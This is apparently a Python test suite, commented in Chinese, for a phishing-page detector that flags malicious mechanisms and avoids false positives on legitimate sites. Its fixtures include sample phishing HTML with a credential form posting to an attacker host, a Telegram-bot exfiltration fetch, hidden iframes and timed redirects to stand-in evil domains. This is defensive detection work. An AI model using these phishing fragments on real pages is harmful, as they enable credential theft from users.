"""
單頁惡意機制判準 φ（analysis/page_mechanisms.evaluate_page）自檢。

這裡測的是 evaluate_page() 本身，也就是兩個判定共用的那把尺：
Node 3 拿它下釣魚判定，Node 4 拿它算兩種 client 的機制集合差。
「BOT 沒有惡意機制」這句話的定義就在它身上，錯了兩個判定一起錯。

節點層多做的事（混淆權重、寫回 state、模型另存）測在 test_phishing.py，不在這裡重抄。
φ 檔案的內容與雜湊鎖在 test_compat.py。
"""
from analysis.page_mechanisms import (
    evaluate_page, _analyze_html_structure, _shannon_entropy,
    PHISHING_CONFIDENCE_THRESHOLD,
)


PHISH_HTML = """
<html><body oncontextmenu="return false;">
<form action="https://evil-collector.duckdns.org/login.php" method="post">
  <input type="text" name="email"><input type="password" name="password">
</form>
<img src="https://www.paypal.com/images/logo.png">
<iframe src="https://tracker.example-evil.tld/x" style="display:none;visibility:hidden"></iframe>
<script>
document.getElementById('password').value;
document.querySelector('[type="password"]');
fetch('https://api.telegram.org/bot123456789:AAFvE7xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=1');
document.onkeydown = function(e){ if(e.keyCode === 123) return false; };
</script></body></html>
"""

LEGIT_HTML = """
<html><body>
<form action="/session" method="post">
  <input type="email" name="email" required>
  <input type="password" name="password" required minlength="8">
</form>
<img src="/static/logo.png">
<script src="https://www.googletagmanager.com/gtm.js?id=GTM-XXXX"></script>
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-XXXX"
  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>
navigator.sendBeacon('/analytics');
document.querySelector('[type="password"]');
</script></body></html>
"""


def test_phishing_page_yields_mechanisms():
    """釣魚頁必須產出惡意機制 —— 沒有機制，Node 4 就沒有東西可以做差分"""
    ev = evaluate_page(PHISH_HTML, "https://secure-login.duckdns.org/verify")
    assert ev["decisive"], "Layer 1 應直接裁決"
    assert "webhook_exfiltration" in ev["mechanisms"], ev["mechanisms"]
    assert "form_action_free_host" in ev["mechanisms"], ev["mechanisms"]


def test_sso_form_not_flagged():
    """憑證表單 POST 到真實 IdP 是合法 SSO，不得觸發 D3/跨網域"""
    _, inds, flags = _analyze_html_structure(
        '<form action="https://login.microsoftonline.com/common/oauth2/authorize">'
        '<input type="email" name="u" required>'
        '<input type="password" name="p" required></form>',
        "https://portal.contoso.com/signin",
    )
    assert "form_action_cross_domain" not in flags, inds
    assert "form_action_free_host" not in flags, inds


def test_shannon_entropy_matches_dataset():
    """與 Dataset.csv 的 entropy 欄位定義一致（rmit 樣本: 3.709147917）"""
    e = _shannon_entropy("https://www.rmit.edu.au/")
    assert abs(e - 3.709147917) < 1e-6, e


def test_legit_page_yields_no_high_spec_mechanism():
    """合法登入頁不得產出高特異性機制 —— 產出了，C2–C4 的閘門就形同虛設"""
    from analysis.page_mechanisms import HIGH_SPECIFICITY_MECHANISMS
    ev = evaluate_page(LEGIT_HTML, "https://app.mycompany.com/login")
    assert not ev["decisive"], f"合法登入頁觸發 Layer 1: {ev['decisive']}"
    assert not (ev["mechanisms"] & HIGH_SPECIFICITY_MECHANISMS), ev["mechanisms"]
    assert "hidden_iframe" not in ev["mechanisms"], "GTM noscript iframe 誤判"
    assert "brand_asset_hotlink" not in ev["mechanisms"], "同域資源誤判為盜連"


def test_form_action_to_ip():
    _, inds, flags = _analyze_html_structure(
        '<form action="http://185.23.44.7/post.php">'
        '<input type="password" name="pwd"></form>',
        "https://bank-verify.example/login",
    )
    assert {"cred_form", "form_action_to_ip"} <= flags, inds


def test_lexical_alone_cannot_decide():
    """不變式：URL 詞彙特徵（WoE 校準那批）全部命中，也不足以單獨判定。

    資料集的正常樣本是舊爬取的短首頁，現代電商 URL 又長又高熵，
    實測 WoE 高估了這些特徵 —— 所以它們只能當佐證。
    """
    from analysis.page_mechanisms import _analyze_url_lexical
    long_url = ("https://shop.example.com/catalog/products/2026/summer-collection"
                "/womens/shoes/running?utm_source=newsletter&utm_campaign=q3&page=2")
    assert len(long_url) > 120
    score, inds, flags = _analyze_url_lexical(long_url)
    assert score < PHISHING_CONFIDENCE_THRESHOLD, f"詞彙層單獨越過閾值: {score} {inds}"
    ev = evaluate_page(LEGIT_HTML, long_url)
    assert not ev["decisive"] and ev["score"] < PHISHING_CONFIDENCE_THRESHOLD, ev["score"]


# ── 隱藏 iframe：8/19 那批兩筆合法站誤判的根因 ────────────────────────
# 兩者都是「第三方 widget 為真瀏覽器插入 iframe，Googlebot 拿不到」，
# 於是 C1 看到「真人有、爬蟲沒有」→ 判 cloaking。那是廣告/社群外掛的
# 差別待遇，不是受測網站在藏東西。

def test_srcless_hidden_iframe_is_not_a_mechanism():
    """沒有 src 的空白 iframe 送不出任何東西（brightika.com 的形狀）。"""
    html = '<html><body><iframe style="display: none;"></iframe></body></html>'
    _, _, flags = _analyze_html_structure(html, "https://www.example-shop.com/")
    assert "hidden_iframe" not in flags, flags


def test_social_share_widget_iframe_is_not_a_mechanism():
    """FB 分享按鈕的隱藏 iframe（socialpolicy.org 的形狀）。

    白名單原本只有 facebook.net（SDK script 來源），分享外掛的 iframe
    指向 facebook.com —— 差一個 TLD。
    """
    html = ('<html><body><iframe style="visibility: hidden" '
            'src="https://www.facebook.com/v2.5/plugins/share_button.php?href=x" '
            'title="fb:share_button Facebook Social Plugin"></iframe></body></html>')
    _, _, flags = _analyze_html_structure(html, "https://www.example-news.org/")
    assert "hidden_iframe" not in flags, flags


def test_hidden_iframe_to_unknown_host_still_flags():
    """別把規則放寬到失效：指向陌生主機的隱藏 iframe 仍要命中。"""
    html = ('<html><body><iframe style="display:none" '
            'src="https://collector-9x.duckdns.org/x.php"></iframe></body></html>')
    _, _, flags = _analyze_html_structure(html, "https://www.example-shop.com/")
    assert "hidden_iframe" in flags, flags


def test_facebook_impersonation_still_detected():
    """社群白名單只給 iframe 規則用 —— 盜連 FB 圖 + 收憑證仍要抓到。

    這是把 _SOCIAL_WIDGET_HOSTS 獨立出來、不併進 _COMMON_THIRD_PARTY 的理由。
    """
    html = ('<html><body><img src="https://www.facebook.com/images/fb_icon.png">'
            '<form action="/login" method="post">'
            '<input type="password" name="pass"></form></body></html>')
    _, _, flags = _analyze_html_structure(html, "https://faceb00k-secure.tk/login")
    assert "brand_asset_hotlink" in flags, flags


# 第三方 JS 的字典不是頁面在做的事 ────────────────────────────────
# 8/21 那批 100 筆：credential_harvesting 命中 48 筆、其中 31 筆只存在於外部 JS，
# brand_impersonation 命中 44 筆。連 GoDaddy 的「Account Suspended」錯誤頁都有
# "password, ssn" 與 "paypal, amazon" —— 那是廣告／同意管理 bundle 的欄位字典與
# 廠商清單，不是頁面在跟使用者要密碼。

_ERROR_PAGE = ("<html><body><h1>Account Suspended</h1>"
               "<p>This site is temporarily unavailable.</p></body></html>")
_VENDOR_BUNDLE = """
var cmpVendors = ["paypal", "amazon", "microsoft", "facebook"];
var fieldMap = {password: 1, ssn: 2, credit_card: 3, cvv: 4};
"""


def test_page_semantics_rules_ignore_third_party_js():
    """scope=html 的類別不得在外部 JS 裡命中。

    這兩類問的是「這一頁在跟使用者要什麼 / 展示哪個品牌」，答案只可能在 HTML 裡。
    """
    with_js = evaluate_page(_ERROR_PAGE, "https://x.example/", extra_js=_VENDOR_BUNDLE)
    for cat in ("credential_harvesting", "brand_impersonation"):
        assert cat not in with_js["indicators"], (cat, with_js["indicators"])
    assert with_js["score"] < 0.1, with_js["score"]


def test_code_behaviour_rules_still_read_deobfuscated_js():
    """對照組：程式碼行為類仍必須看 extra_js，否則混淆過的套件整批漏抓。"""
    html = ('<html><body><form action="/a">'
            '<input type="password" name="password"></form></body></html>')
    js = ('fetch("https://api.telegram.org/bot123456789:'
          'AAFvE7xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=1");')
    r = evaluate_page(html, "https://x.example/login", extra_js=js)
    assert "D1" in r["decisive"], r["indicators"]


def test_setinterval_redirect_needs_location_inside_the_callback():
    """`timed_cloaking_redirect` 不得因為「同一行稍後出現 location」就命中。

    這條規則屬於 HIGH_SPECIFICITY_MECHANISMS —— 它開的是 C2–C4 的閘門，
    對真人端頁面下的是「這頁真的有惡意」的絕對判斷。一條誤報就足以讓一個
    掛 WAF 的正常網站被判成 cloaking，而 CSV 上看起來和真陽性一模一樣。

    舊寫法 r"setInterval\\s*\\(.*location" 的 `.*` 沒有任何限制，
    2026-08-23 的 15 筆冒煙測試裡，合法對照組就是被這條打中的。
    """
    import re
    from analysis.page_mechanisms import PHISHING_RULES
    pats = PHISHING_RULES["timed_cloaking_redirect"]["patterns"]

    def hits(js):
        return [p for p in pats if re.search(p, js, re.IGNORECASE)]

    # ── 不該命中 ──────────────────────────────────────────
    # 輪播計時器 + 無關的 location 讀取，被壓縮器放在同一行
    assert not hits('var t=setInterval(function(){c.next()},5000);'
                    'var u=document.location.href;'), "壓縮碼的無關 location 不該命中"
    # 自動刷新的儀表板 —— setInterval + location 唯一站得住的正常情境
    assert not hits('setInterval(function(){ location.reload() }, 5000)'), \
        "location.reload 是合法的自動刷新"
    assert not hits('setInterval(() => location.reload(), 3000)')

    # ── 仍該命中 ──────────────────────────────────────────
    for js in ('setInterval(function(){ location.href="http://evil.tld" }, 500)',
               'setInterval(() => location.replace("http://evil.tld"), 800)',
               'setInterval(x => { location.href="http://evil.tld" }, 200)'):
        assert hits(js), f"真正的重複跳轉漏抓: {js}"

    # setTimeout 那幾條的行為不得被這次改動影響
    assert not hits('setTimeout(function(){ location.href="/logout" }, 1800000)'), \
        "30 分鐘 session timeout 仍不該命中"
    assert hits('setTimeout(function(){ location.href="http://evil.tld" }, 300)')


def test_every_rule_declares_a_valid_scope():
    """新增規則時忘了想 scope 會靜默沿用 all —— 這條讓它至少是明示的。"""
    from analysis.page_mechanisms import PHISHING_RULES
    html_scoped = {c for c, r in PHISHING_RULES.items() if r.get("scope") == "html"}
    assert html_scoped == {"credential_harvesting", "brand_impersonation"}, html_scoped
    for c, r in PHISHING_RULES.items():
        assert r.get("scope", "all") in ("all", "html"), (c, r.get("scope"))
